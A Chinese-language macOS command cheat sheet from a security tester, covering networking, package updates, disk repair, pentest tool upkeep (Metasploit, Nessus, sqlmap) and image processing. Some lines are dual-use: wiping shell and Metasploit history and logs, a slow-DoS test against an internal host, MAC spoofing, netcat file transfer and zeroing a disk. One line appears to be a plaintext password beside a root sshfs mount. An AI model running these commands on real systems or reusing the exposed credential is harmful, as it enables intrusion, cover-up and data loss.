# mac os 系统完美命令大全
author: M.T.X. 2018-05-14 

## other awesome-macos-command-line
```
https://github.com/herrbischoff/awesome-macos-command-line
```

### 设置当前用户，后面的命令才更好使用
```
export xxx = `whoami`
```

## brew install
```
xcode-select --install
cd /usr/local/
mkdir homebrew && curl -L https://github.com/Homebrew/brew/tarball/master | tar xz --strip 1 -C homebrew
brew update;brew upgrade;brew cleanup
```

## curl 安装最新的
为了规避在使用proxifier,proxychanis的时候发生
https://github.com/libressl-portable/portable/issues/369的问题

```
fatal: unable to access 'https://github.com/Homebrew/homebrew-services/': LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443

curl: (35) LibreSSL SSL_connect: SSL_ERROR_SYSCALL

这样的错误
brew install LibreSSL
brew reinstall --HEAD --with-rtmpdump --with-openssl --with-nghttp2 --with-libmetalink --with-gssapi --with-c-ares  curl
vi ~/.curlrc
--ciphers DEFAULT
```

### 服务启动、重启
```
brew services list 
brew services restart mongodb
```

## 更新修复brew bug
```
https://github.com/Homebrew/brew
cd "$(brew --repo)" && git fetch && git reset --hard origin/master && brew update
```

## 强烈推荐，终端工具	
```
brew install caskroom/cask/iterm2
```

## wget好东西
```
brew install wget
```


## 文本转语音
```
say -v Ting-Ting -f file.txt -o "output.m4a"
say -v Sin-ji '你好，你是猪吗'

say -v ?
Alex                en_US    # Most people recognize me by my voice.
Alice               it_IT    # Salve, mi chiamo Alice e sono una voce italiana.
Alva                sv_SE    # Hej, jag heter Alva. Jag är en svensk röst.
Amelie              fr_CA    # Bonjour, je m’appelle Amelie. Je suis une voix canadienne.
Anna                de_DE    # Hallo, ich heiße Anna und ich bin eine deutsche Stimme.
Carmit              he_IL    # שלום. קוראים לי כרמית, ואני קול בשפה העברית.
Damayanti           id_ID    # Halo, nama saya Damayanti. Saya berbahasa Indonesia.
Daniel              en_GB    # Hello, my name is Daniel. I am a British-English voice.
Diego               es_AR    # Hola, me llamo Diego y soy una voz española.
Ellen               nl_BE    # Hallo, mijn naam is Ellen. Ik ben een Belgische stem.
Fiona               en-scotland # Hello, my name is Fiona. I am a Scottish-English voice.
Fred                en_US    # I sure like being inside this fancy computer
Ioana               ro_RO    # Bună, mă cheamă Ioana . Sunt o voce românească.
Joana               pt_PT    # Olá, chamo-me Joana e dou voz ao português falado em Portugal.
Jorge               es_ES    # Hola, me llamo Jorge y soy una voz española.
Juan                es_MX    # Hola, me llamo Juan y soy una voz mexicana.
Kanya               th_TH    # สวัสดีค่ะ ดิฉันชื่อKanya
Karen               en_AU    # Hello, my name is Karen. I am an Australian-English voice.
Kyoko               ja_JP    # こんにちは、私の名前はKyokoです。日本語の音声をお届けします。
Laura               sk_SK    # Ahoj. Volám sa Laura . Som hlas v slovenskom jazyku.
Lekha               hi_IN    # नमस्कार, मेरा नाम लेखा है. मैं हिन्दी में बोलने वाली आवाज़ हूँ.
Luca                it_IT    # Salve, mi chiamo Luca e sono una voce italiana.
Luciana             pt_BR    # Olá, o meu nome é Luciana e a minha voz corresponde ao português que é falado no Brasil
Maged               ar_SA    # مرحبًا اسمي Maged. أنا عربي من السعودية.
Mariska             hu_HU    # Üdvözlöm! Mariska vagyok. Én vagyok a magyar hang.
Mei-Jia             zh_TW    # 您好，我叫美佳。我說國語。
Melina              el_GR    # Γεια σας, ονομάζομαι Melina. Είμαι μια ελληνική φωνή.
Milena              ru_RU    # Здравствуйте, меня зовут Milena. Я – русский голос системы.
Moira               en_IE    # Hello, my name is Moira. I am an Irish-English voice.
Monica              es_ES    # Hola, me llamo Monica y soy una voz española.
Nora                nb_NO    # Hei, jeg heter Nora. Jeg er en norsk stemme.
Paulina             es_MX    # Hola, me llamo Paulina y soy una voz mexicana.
Samantha            en_US    # Hello, my name is Samantha. I am an American-English voice.
Sara                da_DK    # Hej, jeg hedder Sara. Jeg er en dansk stemme.
Satu                fi_FI    # Hei, minun nimeni on Satu. Olen suomalainen ääni.
Sin-ji              zh_HK    # 您好，我叫 Sin-ji。我講廣東話。
Tessa               en_ZA    # Hello, my name is Tessa. I am a South African-English voice.
Thomas              fr_FR    # Bonjour, je m’appelle Thomas. Je suis une voix française.
Ting-Ting           zh_CN    # 您好，我叫Ting-Ting。我讲中文普通话。
Veena               en_IN    # Hello, my name is Veena. I am an Indian-English voice.
Victoria            en_US    # Isn't it nice to have a computer that will talk to you?
Xander              nl_NL    # Hallo, mijn naam is Xander. Ik ben een Nederlandse stem.
Yelda               tr_TR    # Merhaba, benim adım Yelda. Ben Türkçe bir sesim.
Yuna                ko_KR    # 안녕하세요. 제 이름은 Yuna입니다. 저는 한국어 음성입니다.
Yuri                ru_RU    # Здравствуйте, меня зовут Yuri. Я – русский голос системы.
Zosia               pl_PL    # Witaj. Mam na imię Zosia, jestem głosem kobiecym dla języka polskiego.
Zuzana              cs_CZ    # Dobrý den, jmenuji se Zuzana. Jsem český hlas.
```

## How to Set a Specific IP Address via Terminal in OS X
```
sudo ipconfig set en1 INFORM 192.168.0.150
sudo ifconfig en1 down ; sudo ifconfig en1 up
sudo ipconfig set en1 DHCP
```

## 获取本机ip
```
ifconfig | grep inet | grep -v inet6 | cut -d" " -f2 | tail -n1
ifconfig | grep inet | grep -v inet6 | cut -d" " -f2,3 
```
### 文本中获取本机ip
```
cat 内网445漏洞主机.txt|grep -E "\.(28|29|31)\." |cut -d" " -f2 |cut -d":" -f1
cat 内网445漏洞主机.txt |cut -d" " -f2 |cut -d":" -f1
```
## 去除重复文件
```
brew reinstall fdupes
fdupes -d  -N -r  /Volumes/mtx_hktalent/bak/loot
fdupes -d  -N -r  /Volumes/mtx_hktalent/Awesome
-s --symlinks    	follow symlinks
-H --hardlinks   	normally, when two or more files point to the same
                  	disk area they are treated as non-duplicates; this
                  	option will change this behavior
```

## 查看数据包及路由情况
```
netstat -r
```
## 查看路由情况
```
route get google.com
```

## 查看当前ip
```
ipconfig getifaddr en0
ipconfig getifaddr bridge0
```
## 显示网络配置
```
scselect
```
## 设置静态ip
```
networksetup -setmanual "Ethernet" 192.168.2.100 255.255.255.0 192.168.2.1
```
### 设置代理
```
$ networksetup -getmacaddress Ethernet
networksetup -getmacaddress 'Thunderbolt Ethernet'
networksetup -setwebproxy wi-fi ip port
https设置代理
networksetup -setsecurewebproxy wi-fi ip port
```
### 关闭代理
```
networksetup -setwebproxystate wi-fi off
networksetup -setsecurewebproxystate wi-fi off
```
### 获取mac地址
```
networksetup -listallnetworkservices | grep -v "An asterisk"
networksetup -getmacaddress wi-fi
```
## 参看特定端口进程、使用情况
```
sudo lsof -i :5432
```
## 查看进城信息
```
codesign -vvvv -R="anchor apple" /usr/libexec/rapportd
otool -L /usr/libexec/rapportd
ps -ef |grep -i [r]apport
ps aux | grep rapportd
lsof -i -P | grep -i rapport
```
### 经典的ps命令
```
 ps -aeo ruser,ppid,pid,lstart,%cpu,%mem,etime,tty,args --sort -%cpu,-%mem
```
## 查看缓存中的ip的mac地址
```
arp -a | grep ":" | grep -v "ff:ff:ff" | awk -F ' '  '{print $2 " "  $4}'
```
## 列出当前所有目录、子目录大小
```
du -h * | awk "{print $2}"
```

## 查看当前可用wi-fi
```
airport -s
```
## 当前wi-fi信息
```
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I
```
## 获取当前互联网可见的公网ip
```
curl -s https://api.ipify.org && echo
curl -s http://ip.cn
```

## 显示所有分区信息
```
diskutil list
```
## 文件MD5、sha1、sha512摘要
```
brew install openssl
md5 ysoserial-master.jar 
openssl md5 ysoserial-master.jar 
openssl sha1 ysoserial-master.jar
openssl sha512 ysoserial-master.jar 
```
openssl是个很好的工具哦
## 防火墙命令
```
man pfctl
sudo pfctl -t badhosts -T add 192.168.24.180
sudo pfctl -t badhosts -T show
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/local/bin/node
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/bin/ruby
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /Users/${xxx}/.rvm/rubies/ruby-2.4.3/bin/ruby
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /Users/${xxx}/.rvm/rubies/ruby-2.4.1/bin/ruby

sudo /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp /Users/${xxx}/.rvm/rubies/ruby-2.4.3/bin/ruby
```

## 磁盘检查
```
fsck_hfs -fy -x /dev/rdisk2s1
```
## mac系统拒绝访问某些域名
```
sudo vi /etc/hosts
127.0.0.1	secclientgw.alipay.com
令生效
sudo dscacheutil -flushcache
```
## 苹果系统查看端口对应的pid
```
Depending on your version of Mac OS X, use one of these:

lsof -n -i4TCP:$PORT | grep LISTEN
lsof -n -iTCP:$PORT | grep LISTEN
lsof -n -i:$PORT | grep LISTEN
lsof -n -i4TCP:1234
lsof -n -i4TCP:41419
lsof -p 32259

lsof -n -i:59395 
```
## 临时设置允许打开的文件最大数量
```
ulimit -n 65535
```

## 防止ARP中间人攻击、设置静态mac 地址
```
sudo arp -s 192.168.24.1 84:5b:12:4a:bc:3a
sudo arp -s 192.168.0.1 CC:34:29:97:1C:CC
```

## 排序、合并文件内容，有时候可能会又字符集问题，该命令可搞定，合并结果
```
cat /Volumes/Untitled/rockyou.txt |LC_ALL=C sort|LC_ALL=C uniq > /Volumes/Untitled/rockyou1.txt
```

## 查看查找历史信息
```
export HISTTIMEFORMAT="%F %T `who -u am i 2>/dev/null| awk '{print $NF}'|sed -e 's/[()]//g'`  `whoami` "
```
## 查看已经安装的node js的组件
```
ls -ld /usr/local/lib/node_modules/* | awk '{print $9}'|sed -e 's/\/usr\/local\/lib\/node_modules\///g'
```

## 命令中显示16进制xxd
```
cat *.log|xxd
```

## 清除历史信息、一键优化
```
ls ~/.*his*
cat ~/.bash_history;echo >~/.bash_history
cat ~/.node_repl_history;echo >~/.node_repl_history
echo > /Users/`whoami`/.msf4/history
rm -rf /Users/`whoami`/.msf4/logs/*
rm -rf /Users/`whoami`/.msf4/loot/*
rm -rf /Users/`whoami`/.msf4/local/*
rm -rf /Users/`whoami`/.msf4/logos/*
```
### 笔记自动备份目录
```
cd '/Users/`whoami`/Library/Application Support/Scrivener/Backups/'
ls -lah
mv *.zip /Volumes/mtx_hktalent/bak/
```

### 这些应用占用的空间非常大
```
/Users/${xxx}/Library/Containers/com.tencent.Foxmail
com.tencent.qq
com.tencent.xinWeChat
com.tencent.QQMusicMac

sudo mv /Users/`whoami`/Library/Containers/com.tencent.Foxmail /Volumes/mtx_hktalent/`whoami`/
ln -s /Volumes/mtx_hktalent/`whoami`/com.tencent.Foxmail /Users/`whoami`/Library/Containers/com.tencent.Foxmail 

sudo mv /Users/`whoami`/Library/Containers/com.tencent.xinWeChat /Volumes/mtx_hktalent/`whoami`/
ln -s /Volumes/mtx_hktalent/${xxx}/com.tencent.xinWeChat /Users/`whoami`/Library/Containers/com.tencent.xinWeChat

sudo mv /Users/`whoami`/Library/Containers/com.tencent.qq /Volumes/mtx_hktalent/`whoami`/
ln -s /Volumes/mtx_hktalent/`whoami`/com.tencent.qq /Users/`whoami`/Library/Containers/com.tencent.qq
```
### port删除不使用的包
```
sudo port -f uninstall inactive
sudo port uninstall inactive
```
### 清除编译临时文件
```
sudo port -f clean --all all
sudo rm -rf /opt/local/var/macports/build/*
```
### 清除下载临时文件
```
sudo rm -rf /opt/local/var/macports/distfiles/*
sudo rm -rf /opt/local/var/macports/packages/*
```
### brew清除旧版本和不用的服务
```
brew services cleanup;brew cleanup
```
### 批量删除.svn目录及文件、删除缓存文件
```
find . -name .svn -exec rm -rf "{}" \;
find . -name ._* -exec rm -rf "{}" \;
find . -name "._*.*"  -exec rm -rf "{}" \;
find . -name "._*.eml"  -exec rm -rf "{}" \;
find . -name "*).eml" -exec  rm -rf {} \;
find . -name ".DS_Store" -exec rm -rf "{}" \;
```
### 清理
```
rm -rf "/Users/`whoami`/Library/Developer/Xcode/iOS DeviceSupport/*"
rm -rf "/Users/`whoami`/Library/Application Support/iPhone Simulator/7.1/tmp/*"
sudo rm -rf /System/Library/Caches/com.apple.coresymbolicationd/data
ls -la /opt/local/var/macports
lrwxr-xr-x  1 ${xxx}  staff  36 Aug  7  2016 /opt/local/var/macports -> /Volumes/BOOK/`whoami`/local/macports
ln -s ~/macports  /opt/local/var/macports
rm /opt/local/var/macports
ln -s /Volumes/BOOK/`whoami`/local/macports /opt/local/var/macports
$ which port
/opt/local/bin/port
```
# 更新
### port更新
```
sudo proxychains4 -f ~/pc.conf port -v selfupdate
sudo proxychains4 -f ~/pc.conf port upgrade outdated
sudo proxychains4 -f ~/pc.conf port -d sync
```
其中-v表示verbose（冗余），即把信息都显示到Shell上。
### 更新metasploit-framework
```
cd /Users/${xxx}/safe/metasploit-framework;./msfupdate;bundle install;gem update --system;gem update
pip3 list --outdated | sed 's/(.*//g' | xargs sudo pip3 install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple
```
### 更新python anaconda是所有包
```
conda update -n base conda
conda upgrade --all


python ~/pip2.py list --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple --outdated | sed 's/(.*//g' | xargs sudo python ~/pip2.py install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple
pip list --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple --outdated | sed 's/(.*//g' | xargs sudo pip install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple

pip list --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple --outdated | sed 's/(.*//g' | xargs pip install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple
cd ~/
brew
brew update;brew upgrade
nmap
sudo nmap --script-updatedb
/usr/local/Cellar/nmap/7.60/share/nmap/scripts
git clone https://github.com/scipag/vulscan.git
nmap -sV --script=vulscan/vulscan.nse www.example.com
SQLMap

python /Users/${xxx}/safe/top20/sqlmap-dev/sqlmap.py --update
```
### 更新kali中openvas;更新kali linux
```
apt-get autoclean ;  apt-get update ; apt-get upgrade -y ; apt-get dist upgrade -y
openvas-nvt-sync
apt-get update;apt-get upgrade;apt-get dist-upgrade;apt-get autoclean
```
### brew自身更新和更新所有软件
```
sudo chown -R ${xxx}:wheel /usr/local/Homebrew
cd /usr/local && sudo chown -R ${xxx}:staff .
brew update;brew upgrade
```
### nessus升级
```
brew install proxychains-ng
sudo proxychains4 -f ~/pc.conf nessuscli update --all
sudo nessuscli update --plugins-only
sudo /Library/Nessus/run/sbin/nessusd start
```
### 批量git更新工程
```
cd /Volumes/BOOK/安全/project;
find . -type d -depth 1 -exec git --git-dir={}/.git --work-tree=$PWD/{} pull origin master \;
cd /Users/${xxx}/safe;
find . -type d -depth 1 -exec git --git-dir={}/.git --work-tree=$PWD/{} pull origin master \;
```
### 批量更新python
```
pip3 list --outdated | sed 's/(.*//g' | xargs sudo pip3 install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple
python ~/pip2.py list --outdated | sed 's/(.*//g' | xargs sudo python ~/pip2.py install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple
pip list --outdated | sed 's/(.*//g' | xargs sudo pip install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple
pip install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple beautifulsoup4 lxml Markdown pexpect psycopg2  pyOpenSSL PyVirtualDisplay rdflib selenium six SQLAlchemy tornado
```
### 公开漏洞更新
```
searchsploit -u
```
### 更新所有的ruby环境的包
```
rvm use ruby-2.3.1
```
### 清除旧版本
```
gem cleanup
gem update --system
gem update
gem install rubygems-update;update_rubygems
```
### jar安全溯源工具更新库
```
sudo proxychains4 -f ~/pc.conf dependency-check  --updateonly
cd /usr/local/Cellar/dependency-check/3.0.1/libexec/data/;
/usr/local/Cellar/dependency-check/3.0.1/libexec/data/mycp;ls -la;ls -la /Volumes/mtx_hktalent/bak/
295436288 Dec 27 10:32 dc.h2.db
which dependency-check 
/usr/local/bin/dependency-check
```
### nodeJs完全更新
```
npm cache clean --force
npm-check -u -g --debug
sh ~/npm-upgrade.sh
npm update -g;npm -g outdated
```
### 修复metasploit的ruby环境
```
sudo chmod go-w /usr/local/bin;sudo chmod 775 /usr/local;sudo chmod 775 /usr/local/bin;sudo chmod 775 /usr/local/ant;sudo chmod 775 /usr/local/ant/bin
cd /Users/${xxx}/safe/metasploit-framework;rvm --default use 2.3.1;./msfupdate
cd /Users/${xxx}/safe/metasploit-framework;./msfupdate
bundle update
env ARCHFLAGS="-arch x86_64" bundle install
env ARCHFLAGS="-arch i386" gem install pg
env ARCHFLAGS="-arch i386 -arch x86_64" gem install pg
```
# java渗透，安全审计点滴
## 查找java进程
```
lsof -i -P | grep java | grep LISTEN
```
## 找出没有使用SafeGene的java进程、jvm
```
ps -ef | grep java | grep -v SafeGene.jar
```
## 查找可能存在远程攻击漏洞的进程
```
ps -ef | grep jmxremote
-Dcom.sun.management.jmxremote.port=9999
-Dcom.sun.management.jmxremote.authenticate=false
-Dcom.sun.management.jmxremote.ssl=false
```
注意：
oracle的虚拟机会判断,如果你带上了这些参数,那么会在内部调用sun.management.Agent.premain
属于Java SE的instrumentation技术.
## 查找root启动的java进程
```
ps -ef -U root | grep java
```
## 查找动态sql
```
find . -type f -name "*.xml" | xargs grep -n -E '\$[^\$]+\$'
find . -type f -name "*.class" | xargs grep -n -E 'selsql'
```
## 查找使用了javaagent技术的进程
```
ps -ef | grep "\-javaagent"
```

## 查看ip区域、ip经纬度
```
nmap -n --top-ports 1  --script ip-geolocation-geoplugin 123.125.114.144
curl http://ipinfo.io/123.125.114.144
curl ipinfo.io/123.125.114.144
{
  "ip": "123.125.114.144",
  "hostname": "No Hostname",
  "city": "Beijing",
  "region": "Beijing",
  "country": "CN",
  "loc": "39.9289,116.3883",
  "org": "AS4808 China Unicom Beijing Province Network"
geoiplookup -d /opt/local/share/GeoIP -v -i -l  123.125.114.144
nmap -n --top-ports 1 --script ip-geolocation-maxmind --script-args ip-geolocation.maxmind_db=/opt/local/share/GeoIP/GeoLiteCity-Blocks.csv 123.125.114.144
```
## 发现抓包模式的机器
```
nmap -sV --script=sniffer-detect 192.168.24.10
Host script results:
|_ sniffer-detect: Likely in promiscuous mode (tests: "11111111")
```
## 用nc进行文件传输
#### 在客户端使用
```
nc -nv target_host target_port < file.txt
```
#### 在服务器端使用
```
nc -l port > file.txt
```
#### 使用默认系统ruby版本
```
rvm use system --default
```
## 磁盘空间情况
```
df -h | grep -v 100%
```

## 挂载linux系统文件
```
sudo sshfs -o allow_other,defer_permissions root@192.168.10.115:/MyWork /usr/local/droplet
sudo umount /usr/local/droplet
Z2I|l6b9QGS5*
sudo umount /usr/local/droplet;sudo sshfs -o allow_other,defer_permissions root@23.105.209.65:/usr/mtx/myapp /usr/local/droplet
```

## jar溯源、审计
```
brew install  dependency-check
dependency-check --enableExperimental --project "洛阳市住房公积金管理信息系统升级改造项目jar溯源" -o all_jar溯源.html --scan /usr/local/droplet/webapps/lyhf/WEB-INF/lib/
cd /root/Downloads/dependency-check/
sh ./bin/dependency-check.sh --enableExperimental --project "All jar risk" -o all_jar.html --scan /MyWork/Project/**/
```
## java源码溯源、java源码审计
```
$ java -jar lib/findbugs.jar -h
Picked up JAVA_TOOL_OPTIONS: -Dfile.encoding=UTF-8
edu.umd.cs.findbugs.gui2.Driver [options] [project or analysis results file]
Options:
  General FindBugs options:
    -project <project>                  analyze given project
    -home <home directory>              specify FindBugs home directory
    -pluginList <jar1[:jar2...]>        specify list of plugin Jar files to load
    -effort[:min|less|default|more|max] set analysis effort level
    -adjustExperimental                 lower priority of experimental Bug Patterns
    -workHard                           ensure analysis effort is at least 'default'
    -conserveSpace                      same as -effort:min (for backward compatibility)
    -f <font size>                      set font size
    -clear                              clear saved GUI settings and exit
    -priority <thread priority>         set analysis thread priority
    -loadBugs <saved analysis results>  load bugs from saved analysis results
    -d                                  disable docking
    --nodock                            disable docking
    -look[:plastic|gtk|native]          set UI look and feel

java -jar /Users/${xxx}/safe/top20/findbugs-3.0.1/lib/findbugs.jar -sortByClass -low -html -output myRst.html .


java -jar /Users/${xxx}/safe/top20/findbugs-3.0.1/lib/findbugs.jar -sortByClass -pluginList /Users/${xxx}/safe/top20/findbugs-3.0.1/plugin/findsecbugs-plugin-1.6.0.jar -low -html -output cdsb.html /Volumes/mtx_hktalent/2017/成都三版\ 项目war包/cdsb/WEB-INF/classes 
java -jar /Users/${xxx}/safe/top20/findbugs-3.0.1/lib/findbugs.jar -sortByClass -low -html -output Ta3.html  /Volumes/mtx_hktalent/2017/成都三版\ 项目war包/sxdy/WEB-INF/lib/ta3*.jar
```

## 查看历史连接过的wi-fi
```
networksetup -listpreferredwirelessnetworks en0
defaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences| sed 's|\./|`pwd`/|g' | sed 's|.plist||g'|grep 'LastConnected' -A 7
defaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences |grep SSIDString
defaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences |grep SSIDString
```

## 安全审计命令
```
vi /usr/local/Cellar/lynis/2.4.0/default.prf 
lynis audit system
```
## go语言环境更新
```
/usr/local/opt/go/bin/gopm
```
## 一些链接，优化存储空间
```
ln -s /Volumes/data/iBooks /Users/${xxx}/Library/Containers/com.apple.BKAgentService/Data/Documents/iBooks
ln -s /Volumes/data/iBooks /Users/${xxx}/iBooks
ln -s /Volumes/data/Foxmail /Users/${xxx}/Library/Containers/com.tencent.Foxmail/Data/Library/Foxmail
```
## 命令启动mysql
```
 /usr/local/mysql/bin/mysqld --user=_mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --log-error=/usr/local/mysql/data/mysqld.local.err --pid-file=/usr/local/mysql/data/mysqld.local.pid
```

## 修复mysql
```
cd /usr/local/mysql;sudo chown -R mysql:_mysql  data
```
### mysql无法启动修正
```
cd /usr/local/mysql
sudo chown -R _mysql:staff *
```
## 查看各磁盘使用情况
```
df -h
```
## 查找大于1G的文件
```
find . -type f -size +1000000k -exec ls -lh {} \;
```
## 查找所有连接
```
sudo find / -type l -exec ls -la {} \;
sudo find / -type l -exec ls -la {} \; | grep “/Volumes/”
```

## web应用慢速DDOS攻击测试
```
slowhttptest -v 3 -H -B -R -X -o QIMS.html -c 200 -u http://192.168.24.14:8079/QIMS/login.jsp?test=true -k 10 -g
```
## 并发测试
```
以苹果系统为例
brew install wrk
wrk -t12 -c400 -d30s http://erp.xxx.com:8082
```
## linux查看进程
```
 ps -ef | grep -v -E "\[" | awk '{print $8;}'|sort|uniq|grep "/"
 ps -aeo args --sort -%cpu,-%mem | sort|uniq 
```
## linux查找可疑连接
```
netstat -anlp | grep -v "unix " | grep -v "0.0.0.0:\*" | grep -v ":::\*" | grep -v "/mysqld" | grep -v "/oracle" | grep -v "/ssh"|grep -v "State I-Node" |grep -v "127.0.0.1" |grep -v "Address Foreign Address" | awk '{print $5,$6,$7,$8,$9,$10,$11;}' | grep -v "192.168." | sed 's/::ffff://'| sed 's/ESTABLISHED//'| sed 's/SYN_SENT//'|grep -v "I-Node"| grep -v "Foreign Address" | grep -v "::1:"
https://github.com/NetSPI/PowerUpSQL
http://www.freebuf.com/sectool/131550.html
netstat -anp | grep -v "unix " | grep -v "0.0.0.0:\*" | grep -v ":::\*" | grep -v "/mysqld" | grep -v "/oracle" | grep -v "/ssh"|grep -v "State I-Node" | grep -v "servers and established"  |grep -v "127.0.0.1" | grep -v  established |grep -v "Address Foreign Address" | awk '{print $5,$6,$7,$8,$9,$10,$11;}' | grep -v "192.168." | sed 's/::ffff://'| sed 's/ESTABLISHED//'| sed 's/SYN_SENT//'|grep -v "I-Node"| grep -v "Foreign Address" | grep -v "::1:" | sed 's/FIN_WAIT2 - //' | sed 's/CLOSE_WAIT//'| sed 's/LAST_ACK -//'| sed 's/TIME_WAIT -//'|sort|uniq 
```
## 苹果系统查看可疑连接
```
netstat -A | grep -E "tcp4|udp4" | grep -E '\d+.\d+.\d+.\d+'
```
## 获取所有磁盘信息
```
diskutil info -all
```
## 映射ntfs磁盘可读写
```
mkdir /Users/${xxx}/C
sudo umount /Users/${xxx}/C
sudo mount -t ntfs -o nobrowse,rw /dev/disk5s1 /Users/${xxx}/C
```
## nessus启动
```
sudo /Library/Nessus/run/sbin/nessusd start
```
## nessus连接
```
/Library/Nessus/run/var/nessus/plugins-code.db
https://localhost:8834/#/
```

## 去除重复数据
```
cat xiaozu.txt |sort|uniq
```
## 查看各磁盘情况
```
diskutil list
```
## 查看端口的连接
```
netstat -na | grep 8080
netstat -na | grep tcp4 | grep -v "*.*" | grep -v "127.0.0.1" | awk '{print $5;}'
```
## 扫描mac地址信息
```
sudo arp-scan 192.168.1.0/16 |grep '\d*\.\d*\.\d*\.\d*' | grep -v DUP
sudo arp-scan --localnet|grep '\d*\.\d*\.\d*\.\d*' | grep -v DUP
sudo arp-scan --localnet| grep -v DUP | grep -e '\d*\.\d*\.'
sudo arp-scan 192.168.0.1/16
sudo arp-scan --interface=en0 --localnet| grep -v DUP | grep -e '\d*\.\d*\.'
sudo arp-scan 192.168.0.1/16| grep -v DUP | grep -e '\d*\.\d*\.'
```
## 启动mysql
```
sudo chown -R _mysql:_mysql /usr/local/mysql/data
/usr/local/mysql/support-files/mysql.server start
```

## 修改mac地址不需要停网卡
```
networksetup -listallhardwareports
Hardware Port: Wi-Fi
Device: en0
Ethernet Address: b8:e8:56:02:4e:8c

Hardware Port: Bluetooth PAN
Device: en2
Ethernet Address: b8:e8:56:02:4e:8d

Hardware Port: Thunderbolt 1
Device: en1
Ethernet Address: 32:00:17:ff:a0:00

Hardware Port: Thunderbolt Bridge
Device: bridge0
Ethernet Address: 32:00:17:ff:a0:00
手机mac地址54:9F:13:1A:CD:78
sudo ifconfig bridge0 ether 54:9F:13:1A:CD:78
echo ${rtpswd} | sudo -S  ifconfig bridge0 ether b8:12:34:56:78:88
echo ${rtpswd} | sudo -S ifconfig en0 ether  28:d2:48:6d:1b:88

sudo ifconfig en0 ether 54:9F:13:1A:CD:78
sudo ifconfig en0 ether  88:BB:8B:6b:88:86

sudo ifconfig bridge0 ether 8A:73:58:25:66:D5
sudo ifconfig bridge0 ether AB:CD:78:12:34:56

sudo ifconfig bridge0 inet6  8888::bbbb:6666:555:8888%bridge0 prefixlen 64 secured scopeid 0x6
sudo ifconfig bridge0 inet6  '8888::bbbb:6666:555:8888%bridge0 prefixlen 64 secured scopeid 0x6'
```

## 关闭ipv6
```
networksetup -setv6off wi-fi
networksetup -setv6off bridge0
```
## 查看IP
```
ifconfig en0
```
## 批量杀进程
```
 ps -ef | grep postgres |grep -v grep|cut -c 6-11|xargs kill -9
 ps -ef | grep port |grep -v grep|cut -c 6-11|xargs kill -9
```
## 修复磁盘
```
fsck_hfs -fy -x /dev/rdisk2s2
```

## 关闭ipv6
```
networksetup -listnetworkserviceorder
networksetup -setv6off 'Wi-Fi'
networksetup -setv6off 'iPhone USB'
networksetup -setv6off 'Bluetooth PAN'
networksetup -setv6off 'Thunderbolt'
```
## 查找大于1G的文件
```
find . -type f -size +100000k -exec ls -lh {} \;
```
## 16进制显示
```
xxd  ~/C/targets.txt 
```

## 手机短信存储位置
```
/Users/${xxx}/Library/Containers/com.apple.iChat/Data/Library/Messages/Archive
/Users/${xxx}/Library/Containers/com.apple.iChat/Data/
```
## 修复airport
```
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
```
## 批量去除背景
```
Adobe Acrobat Pro DC
可以批量处理背景图片哈


https://www.imagemagick.org/download/binaries/ImageMagick-7.0.7-28-Q16-x64-static.exe
https://www.imagemagick.org/download/binaries/ImageMagick-7.0.7-28-Q16-x86-static.exe

brew install ImageMagick
brew install ImageMagick --with-pango --with-perl --with-opencl --with-openjpeg --with-ghostscript --with-fontconfig 

很多实用脚背
http://www.fmwconcepts.com/imagemagick/textcleaner/index.php

一些去除背景的例子
http://www.imagemagick.org/discourse-server/viewtopic.php?t=32305


1、苹果系统：mac os系统

2、安装：brew
xcode-select --install
ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
brew install ImageMagick


3、很不错的去除背景的命令、参数
1）、convert ok.jpg \( +clone -blur 0x20 \) -compose Divide_Src -composite  kkk.jpg
2）、convert ok.jpg -fuzz 20% -transparent white result.png

magicwand 1,1 -t 20 -f image -r outside -m overlay -o 0 image.jpg imgOutput.png
magick 1335624623-956109868.jpg -fuzz 20% -fill none -draw "alpha 1x1 floodfill" result.png


4、查找、批量处理:去除背景（处理前记得先备份）
find ./ -type f \( -iname \*.jpg -o -iname \*.png -o -iname \*.ttf -o -iname \*.tif \) -exec convert {} \( +clone -blur 0x20 \) -compose Divide_Src -composite {} \;

3、查找图片
find ./ -type f \( -iname \*.jpg -o -iname \*.png -o -iname \*.ttf -o -iname \*.tif -o -iname \*.jpeg \) 
Explanation:
	•	type -f - only search for files (not directories)
	•	\( - needed for the type -f to apply to all arguments
	•	-o - logical OR operator
	•	-iname - like -name, but the match is case insensitive

```
## 新硬盘格式化bug解决
```
问题解决：
MediaKit reports not enough space on device for requested operation.
https://mycyberuniverse.com/web/how-fix-mediakit-reports-not-enough-space-on-device.html

1、diskutil list

/dev/disk4 (external, physical):
   #:                       TYPE NAME                    SIZE       IDENTIFIER
   0:      GUID_partition_scheme                        *4.0 TB     disk4
   1:         Microsoft Reserved                         134.2 MB   disk4s1
   2:       Microsoft Basic Data                         4.0 TB     disk4s2

2、diskutil unmountDisk force disk4

3、sudo dd if=/dev/zero of=/dev/disk4 bs=1024 count=1024
格式化盘
4、diskutil partitionDisk disk4 GPT JHFS+ "Elements" 0g

5、用系统的disk utility工具分区
```
